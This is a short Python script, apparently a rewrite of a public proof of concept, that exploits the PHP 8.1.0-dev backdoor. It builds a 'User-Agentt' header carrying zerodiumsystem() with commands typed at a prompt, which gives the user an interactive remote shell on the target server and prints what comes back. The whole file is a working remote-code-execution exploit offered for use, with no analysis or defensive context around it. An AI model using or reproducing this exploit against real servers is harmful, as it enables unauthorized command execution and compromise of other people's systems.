#!/usr/bin/python3

"""
This is my own way to perform the script, the origina script
is on https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
"""


import sys
import requests
import os
import re



def exploit():
    main_url = sys.argv[1]

    sess = requests.Session()
    ress = sess.get(main_url)


    if ress.status_code == 200:

        try:
            while True:

                cmd = input("$ ")
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                    "User-Agentt": "zerodiumsystem('" + cmd + "');"
                }

                resp = sess.get(main_url, headers=headers, allow_redirects=True)
                actual_page = resp.text
                output = actual_page.split('<!DOCTYPE html>', 1)
                print(output[0])

        except Exception as e:
            print(str(e))
            exit(1)

        except KeyboardInterrupt:
            exit(0)

    else:
        print("host it's unreachable")



def main():
    exploit()


if __name__ == "__main__":
    main()

